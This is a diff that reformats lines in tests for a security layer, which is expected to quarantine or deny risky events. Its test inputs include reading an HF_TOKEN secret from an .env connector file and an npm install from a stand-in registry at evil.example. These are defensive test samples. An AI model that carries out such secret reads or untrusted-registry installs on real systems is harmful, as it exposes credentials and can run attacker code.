@@ -57,7 +57,9 @@ def test_dependency_install_non_default_registry_quarantines() -> None:
 
 def test_secret_environment_reference_quarantines() -> None:
     layer = _load_module()
-    report = layer.classify_events([{"event_type": "env", "text": "read HF_TOKEN from config/connector_oauth/.env.connector.oauth"}])
+    report = layer.classify_events(
+        [{"event_type": "env", "text": "read HF_TOKEN from config/connector_oauth/.env.connector.oauth"}]
+    )
 
     assert report.decision in {"QUARANTINE", "DENY"}
     controls = {hit.control for hit in report.controls}
@@ -67,7 +69,10 @@ def test_secret_environment_reference_quarantines() -> None:
 
 def test_cli_writes_security_event_receipt(tmp_path: Path) -> None:
     events = tmp_path / "events.jsonl"
-    events.write_text(json.dumps({"event_type": "command", "command": "npm install leftpad --registry https://evil.example"}) + "\n", encoding="utf-8")
+    events.write_text(
+        json.dumps({"event_type": "command", "command": "npm install leftpad --registry https://evil.example"}) + "\n",
+        encoding="utf-8",
+    )
     out_dir = tmp_path / "out"
 
     result = subprocess.run(
